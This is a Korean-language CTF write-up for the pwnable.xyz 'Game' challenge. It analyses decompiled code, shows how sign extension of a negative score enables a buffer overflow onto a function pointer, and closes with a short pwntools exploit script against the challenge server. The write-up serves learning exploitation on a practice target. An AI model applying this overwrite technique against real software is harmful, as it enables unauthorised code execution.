---
layout: post
title:  "Pwnable.xyz Game write-up"
date:   2020-01-27 19:45:55
image:  pwnable_xyz_game.PNG
tags:   [Pwnable_xyz]
categories: [Write-up]
---

### 1.  문제

 

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled.png)

PIE가 안걸려있다. got overwrite가 가능할것이다. 빠르게 문제를 확인해보자

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%201.png)

게임을 플레이할 이름을 입력한 후, 게임 플레이, 저장, 이름 수정이 가능한 메뉴가 나온다. 그리고 게임을 플레이하고 문제를 맞추게 된다면 1점, 틀리면 -1이 덧해진다

<br>

**3) 코드 확인**

    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // eax
    
      setup(argc, argv, envp);
      puts("Shell we play a game?");
      init_game();
      while ( 1 )
      {
        while ( 1 )
        {
          print_menu();
          printf("> ");
          v3 = read_int32();
          if ( v3 != 1 )
            break;
          (*((void (**)(void))cur + 3))();
        }
        if ( v3 > 1 )
        {
          if ( v3 == 2 )
          {
            save_game();
          }
          else
          {
            if ( v3 != 3 )
              goto LABEL_13;
            edit_name();
          }
        }
        else
        {
          if ( !v3 )
            exit(1);
    LABEL_13:
          puts("Invalid");
        }
      }
    }

입력한 메뉴가 v3변수에 들어가고, 각 메뉴에 맞는 함수가 실행된다. 주의 깊게 봐야하는 함수는 게임초기세팅과 관련된 init_game(), 실제 게임이 실행되는 play_game(), 게임을 저장하는 save_game(), 이름을 수정할수 있는 edit_name()이다.

<br>

- **init_game()**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%202.png)

saves는 전역변수로 설정되어있는 배열이다. find_last_save() 함수의 반환값으로 cur에는 동적할당한 주소값이 들어있다. 해당 위치에 0x10 크기만큼 이름을 입력받고, +3 위치에 play_game 함수의 주소값을 넣는다. 아마 이부분은 직접 확인해 봐야 정확할것 같다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%203.png)

init_game 함수가 종료되고 현재 힙영역에 다음과 같이 들어가있다. a를 8개 입력하고 엔터를 쳤으니 0x61 8개, 0xa 1개 가 들어가 있다. 해당 데이터는 cur에 위치해 있고, 아까 play_game 함수의 위치는 cur+0x18 위치에 있다. 아까 +3이 8바이트 단위로 저장하는 것으로 보인다

<br>


- **play_game()**  

```c
unsigned __int64 play_game()
{
  __int16 v0; // dx
  __int16 v1; // dx
  __int16 v2; // dx
  __int16 v3; // dx
  int fd; // [rsp+Ch] [rbp-124h]
  int v6; // [rsp+10h] [rbp-120h]
  unsigned int buf; // [rsp+14h] [rbp-11Ch]
  unsigned int v8; // [rsp+18h] [rbp-118h]
  unsigned __int8 v9; // [rsp+1Ch] [rbp-114h]
  char s; // [rsp+20h] [rbp-110h]
  unsigned __int64 v11; // [rsp+128h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("Can't open /dev/urandom");
    exit(1);
  }
  read(fd, &buf, 0xCuLL);
  close(fd);
  v9 &= 3u;
  memset(&s, 0, 0x100uLL);
  snprintf(&s, 0x100uLL, "%u %c %u = ", buf, (unsigned int)ops[v9], v8);
  printf("%s", &s);
  v6 = read_int32();
  if ( v9 == 1 )
  {
    if ( buf - v8 == v6 )
      v1 = *((_WORD *)cur + 8) + 1;
    else
      v1 = *((_WORD *)cur + 8) - 1;
    *((_WORD *)cur + 8) = v1;
  }
  else if ( (int)v9 > 1 )
  {
    if ( v9 == 2 )
    {
      if ( buf / v8 == v6 )
        v2 = *((_WORD *)cur + 8) + 1;
      else
        v2 = *((_WORD *)cur + 8) - 1;
      *((_WORD *)cur + 8) = v2;
    }
    else if ( v9 == 3 )
    {
      if ( v8 * buf == v6 )
        v3 = *((_WORD *)cur + 8) + 1;
      else
        v3 = *((_WORD *)cur + 8) - 1;
      *((_WORD *)cur + 8) = v3;
    }
  }
  else if ( !v9 )
  {
    if ( v8 + buf == v6 )
      v0 = *((_WORD *)cur + 8) + 1;
    else
      v0 = *((_WORD *)cur + 8) - 1;
    *((_WORD *)cur + 8) = v0;
  }
  return __readfsqword(0x28u) ^ v11;
}
```


코드가 복잡해 보이지만, 자세히 분석해보면 이해하기 그리 어렵지 않다.  문제를 계속 실행시켜보면, 덧셈, 뺄셈, 나눗셈, 곱셈을 랜덤하게 묻는다. 위의 snprintf 부분이 랜덤적으로 출력해주는 부분이고, v9에 따라서 연산의 종류에 따른 조건분기가 일어난다. 대충 흐름을 파악했으니, play_game() 함수의 실행 결과를 보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%204.png)

0xffff 부분이 추가가 되었다. 해당 부분은 cur+0x10 위치인데, 헥스레이보다 직접 어셈으로 보면 바로 이해가 간다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%205.png)

rdx에는 cur의 주소가 들어가 있다. mov가 아닌 movzx 명령어를 사용했음으로 크기가 다른 데이터의 복사가 가능하다. rdx+0x10 위치에 들어있는 2바이트 값을 edx에 4바이트 만큼 복사하고, 남는 상위 2바이트는 0으로 채운다. 

현재 스코어가 0에서 시작하여 한문제 틀렸음으로 -1 이 들어가고 edx에서 dx 크기인 2바이트가 cur+0x10 위치에 들어가는데 해당 값은 2의보수 표현으로 0xffff가 들어가있다. 

따라서 이를 통해 정리를 할 수 있다. cur은 사용자가 정의한 구조체이다. **name**은 입력하는 0x10 크기의 char형 배열, **score**를 저장하는 int16형 변수, 그리고 **play_game** 함수의 주소를 저장하는 0x8 크기의 함수포인터 변수로 구성되어 있다. 

<br>

아이다는 구조체가 표시되지 않음으로 직접 수정해주자. 다음 사이트를 참고하면 변경 가능하다.


---
[ida에서 구조체 분석할 때 팁](https://blog.kimtae.xyz/242)
---


아이다에 cur 변수에 대한 구조체를 직접 정의해주면 다음과 같이 보기 편하게 변경된다. 아래 사진은 play_game 함수 부분인데, cur 변수가 표현되있는 다른 함수부분들도 보기 편하게 변경되어 있다 

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%206.png)

<br>

- **save_game()**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%207.png)

save_game() 함수도 구조체가 적용되어 보기편하게 바꼈다. 18라인에서 cur→score의 값을 save[i]+0x10 위치에 저장하고, cur의 시작주소를 saves[i]의 시작주소변경한다. 따라서 cur에는 이전에 저장된 데이터들은 새로 13라인에서 동적할당 주소에 고대로 복사하게된다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%208.png)

밑줄친 부분은 위 사진의 18라인의 어셈부분인데, movsx로 복사가 이뤄진다. movsx는 ax의 첫비트를 부호비트로 판단하여 rax의 나머지 6바이트를 부호비트의 값으로 채우는데, 현재0xffff가 들어있으므로, rax는 결국 0xffffffffffffffff 이 들어가게된다.

<br>

- **edit_name()**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%209.png)

edit 함수는 cur의 시작주소부터 널을 만나기 전까지 사이즈 체크를 하는데, 정상적으로는 0x10 크기만큼 처음에 입력을 받을 수 있었는데 위 movsx 명령어 때문에 cur+0x10 위치가 전부 f로 채워지기때문에 cur+0x8 + 0x8  여기서 + 0x8 까지 넘어가게 된다. 그리고 play_game() 함수의 주소까지 넘어가고, 그 뒤의 0까지 검사를 한다.

<br>

다음처럼 save_game 함수의 결과가 나온다.

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20Game/Untitled%2010.png)

이를 이용하여 cur+0x18 위치의 값을 win 함수의 주소로 변경시키면 된다

<br><br>

### 2. 접근방법

1. 이름을 0x10 꽉채워서 입력한다
2. 1번을 눌러서 게임을 진행한 후, 스코어를 저정한다
3. 2번을 눌러 게임을 저장한다
4. 3번을 눌러 cur+0x18 위치에 win 함수주소를 저장한다 

<br><br>

### 3. 풀이

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level='debug'
    p=remote("svc.pwnable.xyz",30009)
    
    p.sendafter("Name: ",'a'*16)
    p.sendlineafter("> ","1")
    p.sendlineafter("= ",'3')
    p.sendlineafter("> ","2")
    p.sendlineafter("> ","3")
    p.send('a'*24+p64(0x4009d6)[:3])
    p.sendlineafter("> ","1")
    p.interactive()

<br><br>

### 4. 몰랐던 개념

- 아이다 구조체 직접 선언 방법. 바로 전문제에서 확인하였는데 바로 적용해보았다. 매우 좋은 기능인 것 같다.
- movzx a,b  
    제로 확장의 의미로, 크기가 다른 데이터의 이동이 가능하다. b가 2바이트고 a가 4바이트라면 상위 2바이트는 0으로 채워진다.

- movsx a,b  
    부호 확장의 의미로, a의 남는 자리를 b의 부호비트로 채운다.